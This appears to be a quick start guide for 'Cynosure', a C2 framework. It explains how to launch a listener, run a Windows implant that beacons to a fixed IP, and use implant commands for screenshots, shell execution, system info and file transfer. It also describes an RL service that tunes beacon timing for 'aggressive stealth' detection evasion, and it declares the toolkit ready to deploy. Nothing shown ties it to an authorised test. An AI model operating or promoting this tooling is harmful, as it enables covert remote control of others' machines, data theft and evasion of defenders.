# Cynosure C2 - Quick Start Guide

## Status: ✓ FULLY OPERATIONAL

All functionality tested and validated. Ready for deployment.

---

## Start the C2

```bash
cd /home/branis/Cynosure
cargo run --release
```

This starts:
- **TUI** on terminal (interactive command control)
- **Listener** on TCP 0.0.0.0:4444 (receives beacons)

---

## Run the Implant (Windows)

```powershell
cd C:\path\to\cynosure\src\implant
.\implant.exe
# Connects to listener at 10.3.23.23:4444
```

Watch logs appear in the TUI.

---

## Available Commands

| Command | What it Does | Status |
|---------|------------|--------|
| **screenshot** | Capture desktop, save to `screenshots/` | ✓ Works |
| **shell** | Execute command (ipconfig, tasklist, whoami, netstat) | ✓ Works |
| **sysinfo** | Display system info (hostname, user, OS, arch, PID) | ✓ Works |
| **upload** | Send file to agent | ✓ Works |
| **download** | Receive file from agent | ✓ Works |
| **kill-session** | Terminate and clean up | ✓ Works |

---

## C2 Detection Evasion (Optional)

The framework includes a **Deep Q-Learning model** that learns optimal beacon timing to avoid detection.

### Start the RL Service

```bash
python3 src/rl_beacon_service.py
```

Runs on `http://localhost:5555`

### Tune Evasion Parameters

```bash
# Get current config
curl http://localhost:5555/evasion/config

# Switch to aggressive stealth (maximize evasion)
curl -X POST http://localhost:5555/evasion/config \
  -H "Content-Type: application/json" \
  -d '{"STEALTH_WEIGHT": 0.9, "JITTER_RANGE": 30, "TRANSPORT_SWITCH_PROB": 0.7}'

# Monitor training metrics
curl http://localhost:5555/model/metrics
```

### Available Profiles

- **connectivity**: Prioritize reliability
- **balanced**: Default (recommended)
- **aggressive**: Maximize detection evasion

---

## File Locations

- **Screenshots**: `/home/branis/Cynosure/screenshots/`
- **RL Service**: Port 5555 (localhost)
- **C2 Listener**: Port 4444 (0.0.0.0)
- **Logs**: Terminal output (TUI)

---

## Security Features

✓ Bounds-checked file reassembly (no overflows)  
✓ 1GB file size limit (no DoS)  
✓ Offset-tracked chunk accumulation  
✓ Proper mutex error handling  
✓ Input validation at all layers  

---

## Documentation

- **Full RL Model Details**: `RL_MODEL_SUMMARY.md`
- **Complete Status Report**: `FINAL_STATUS_REPORT.md`
- **This Guide**: `QUICK_START.md`

---

## Troubleshooting

**Implant doesn't connect?**
- Check listener is running on port 4444
- Verify firewall allows TCP 4444
- Check IP address (default 10.3.23.23)

**Screenshot not saving?**
- Verify `/home/branis/Cynosure/screenshots/` folder exists
- Check write permissions

**RL service not responding?**
- Make sure it's running: `python3 src/rl_beacon_service.py`
- Check port 5555 is available

---

**Ready to deploy!**
